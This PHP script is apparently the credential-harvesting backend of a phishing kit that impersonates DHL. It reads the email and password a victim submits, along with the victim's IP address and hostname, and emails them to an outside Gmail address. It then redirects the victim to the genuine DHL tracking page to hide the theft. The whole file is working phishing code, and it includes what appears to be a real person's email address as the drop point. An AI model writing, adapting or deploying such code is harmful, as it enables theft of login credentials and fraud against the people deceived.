<?php 
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['email'];
$hostname = gethostbyaddr($ip);
$message .= "----------------------------\n";
$message .= "User: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "-----------------------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";



$subject = "N3w DHL | ".$email."\n";
$headers = "From: DON GURU<$email>\n";
mail("susumu.ogini@gmail.com",$subject,$message,$headers);

header("Location: http://dhl.com/en/express/tracking.html");
?>